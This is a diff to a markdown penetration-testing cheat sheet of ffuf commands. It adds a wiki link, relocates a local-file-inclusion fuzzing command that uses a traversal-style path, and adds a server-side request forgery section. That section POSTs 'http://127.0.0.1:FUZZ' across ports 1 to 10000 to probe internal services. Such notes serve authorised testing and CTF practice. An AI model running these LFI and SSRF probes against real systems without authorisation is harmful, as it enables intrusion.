@@ -521,6 +521,8 @@ $ feroxbuster -u http://<RHOST> -x js,bak,txt,png,jpg,jpeg,php,aspx,html --extra
 
 > https://github.com/ffuf/ffuf
 
+> https://github.com/ffuf/ffuf/wiki
+
 ```c
 $ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fs <NUMBER> -mc all
 $ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fw <NUMBER> -mc all
@@ -535,12 +537,6 @@ $ ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u htt
 $ ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
 ```
 
-### Searching for LFI
-
-```c
-$ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
-```
-
 ### Fuzzing with PHP Session ID
 
 ```c
@@ -551,6 +547,33 @@ $ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-low
 
 ```c
 $ ffuf -w /usr/share/seclists/Fuzzing/6-digits-000000-999999.txt -request <FILE> -request-proto "https" -mc 302 -t 150 | tee progress
+```
+
+### Searching for LFI
+
+```c
+$ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
+```
+
+### Server-Side Request Forgery (SSRF)
+
+```c
+$ seq 1 10000 | ffuf -w - -u http://<RHOST> -X POST -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylUeVtv36vebZPACI" -d '------WebKitFormBoundarylUeVtv36vebZPACI            
+Content-Disposition: form-data; name="foobar"
+
+http://127.0.0.1:FUZZ
+------WebKitFormBoundarylUeVtv36vebZPACI
+Content-Disposition: form-data; name="foobar"; filename=""
+Content-Type: application/octet-stream
+
+
+------WebKitFormBoundarylUeVtv36vebZPACI--' -fr "<PATTERN>"
+```
+
+#### Request File Example
+
+```c
+$ seq 1 10000 | ffuf -w - -request <FILE>.req -u http://<RHOST> -fr "<PATTERN>"
 ```
 
 ### Testing
